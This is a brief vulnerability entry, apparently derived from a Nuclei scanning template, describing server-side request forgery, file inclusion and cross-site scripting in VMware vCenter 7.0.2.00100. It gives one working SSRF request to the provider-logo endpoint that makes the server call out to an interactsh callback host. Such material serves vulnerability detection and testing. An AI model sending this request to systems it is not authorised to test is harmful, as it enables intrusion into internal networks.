# Vulnerability: VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting
**Classification:** CWE-918
**Source:** Nuclei Template (`vmware-vcenter-ssrf.yaml`)

## Description
VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
```

